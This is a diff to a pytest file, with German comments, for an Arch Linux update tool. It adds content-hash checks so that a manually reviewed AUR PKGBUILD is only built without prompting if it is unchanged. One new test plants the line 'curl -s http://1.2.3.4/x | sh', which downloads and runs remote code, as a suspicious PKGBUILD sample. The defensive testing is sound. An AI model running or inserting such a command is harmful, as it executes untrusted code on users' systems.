@@ -6,7 +6,7 @@ from pathlib import Path
 
 import pytest
 
-from update_planner import config, executor
+from update_planner import aur_scanner, config, executor
 
 SECRET = 'S3cr3t-pw!'  # noqa: S105 – Testwert
 
@@ -258,13 +258,18 @@ def test_flatpak_install_dry_run_runs_nothing(calls):
     assert r.ok and calls == []
 
 
+class _Built(list):
+    """Gebaute Paketdateien plus Hash des geprüften PKGBUILD."""
+    review_hash = ''
+
+
 def _aur_env(monkeypatch, tmp_path):
     build = tmp_path / 'aur'
     d = build / 'foo'
     (d / '.git').mkdir(parents=True)
-    (d / 'PKGBUILD').write_text("pkgname=foo\nsource=('https://example.org/foo.tar.gz')\nsha256sums=('"
-                                + 'a' * 64 + "')\nb2sums=('SKIP')\n")
-    pkgs = [d / 'foo-1-1-x86_64.pkg.tar.zst', d / 'foo-debug-1-1-x86_64.pkg.tar.zst']
+    text = "pkgname=foo\nsource=('https://example.org/foo.tar.gz')\nsha256sums=('" + 'a' * 64 + "')\nb2sums=('SKIP')\n"
+    (d / 'PKGBUILD').write_text(text)
+    pkgs = _Built([d / 'foo-1-1-x86_64.pkg.tar.zst', d / 'foo-debug-1-1-x86_64.pkg.tar.zst'])
     for p in pkgs:
         p.write_text('x')
     monkeypatch.setattr(config, 'AUR_BUILD', build)
@@ -280,12 +285,13 @@ def _aur_env(monkeypatch, tmp_path):
             return 'foo-debug\n' if 'debug' in cmd[2] else 'foo\n'
         raise AssertionError(cmd)
     monkeypatch.setattr(executor, '_run_text', fake_text)
+    pkgs.review_hash = aur_scanner.review_hash([text])      # Fingerabdruck des „geprüften“ PKGBUILD
     return pkgs
 
 
 def test_aur_new_install_picks_wanted_package(calls, monkeypatch, tmp_path):
     pkgs = _aur_env(monkeypatch, tmp_path)
-    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], install_aur={'foo'}, reviewed={'foo'})
+    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], install_aur={'foo'}, reviewed={'foo': pkgs.review_hash})
     r = asyncio.run(executor.Runner(plan, _cbs_answer([], True, []), SECRET, {}).run())
     assert r.ok and r.updated == ['foo']
     installs = [c for c in _no_sudo_cmds(calls) if c[:2] == ['pacman', '-U']]
@@ -293,8 +299,8 @@ def test_aur_new_install_picks_wanted_package(calls, monkeypatch, tmp_path):
 
 
 def test_aur_update_of_not_installed_package_is_skipped(calls, monkeypatch, tmp_path):
-    _aur_env(monkeypatch, tmp_path)               # „foo“ ist nicht installiert → als Update gibt es nichts zu tun
-    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], reviewed={'foo'})
+    pkgs = _aur_env(monkeypatch, tmp_path)        # „foo“ ist nicht installiert → als Update gibt es nichts zu tun
+    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], reviewed={'foo': pkgs.review_hash})
     r = asyncio.run(executor.Runner(plan, _cbs_answer([], True, []), SECRET, {}).run())
     assert r.skipped == ['foo'] and not any(c[:2] == ['pacman', '-U'] for c in _no_sudo_cmds(calls))
 
@@ -356,3 +362,28 @@ def test_flatpak_remove_arguments(calls, user, expected):
 def test_remove_names_are_validated(calls, field, value):
     r = asyncio.run(executor.Runner(executor.Plan(repo=False, snapshot=False, **{field: value}), cbs([]), SECRET, {}).run())
     assert not r.ok and calls == []
+
+
+def test_aur_review_applies_only_to_the_reviewed_content(calls, monkeypatch, tmp_path):
+    """Ein auffälliges PKGBUILD wird nur ohne Rückfrage gebaut, wenn es genau das geprüfte ist."""
+    pkgs = _aur_env(monkeypatch, tmp_path)
+    (tmp_path / 'aur' / 'foo' / 'PKGBUILD').write_text("pkgname=foo\ncurl -s http://1.2.3.4/x | sh\n")   # neu, verdächtig
+    for name, hashes, expect_ask in (('geändert', {'foo': pkgs.review_hash}, True), ('ohne Freigabe', {}, True)):
+        asked, log = [], []
+        plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], install_aur={'foo'}, reviewed=hashes)
+        r = asyncio.run(executor.Runner(plan, _cbs_answer(log, False, asked), SECRET, {}).run())
+        assert bool(asked) is expect_ask and r.skipped == ['foo'], name
+        if hashes:
+            assert any('seit der manuellen Prüfung geändert' in line for line in log)
+    # passende Freigabe: dieselbe Datei, kein Nachfragen
+    text = (tmp_path / 'aur' / 'foo' / 'PKGBUILD').read_text()
+    asked = []
+    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], install_aur={'foo'},
+                         reviewed={'foo': aur_scanner.review_hash([text])})
+    r = asyncio.run(executor.Runner(plan, _cbs_answer([], False, asked), SECRET, {}).run())
+    assert asked == [] and r.updated == ['foo']
+
+
+def test_review_hash_is_content_based_and_order_independent():
+    assert aur_scanner.review_hash(['a', 'b']) == aur_scanner.review_hash(['b', 'a'])
+    assert aur_scanner.review_hash(['a']) != aur_scanner.review_hash(['a ']) != aur_scanner.review_hash(['a', 'b'])
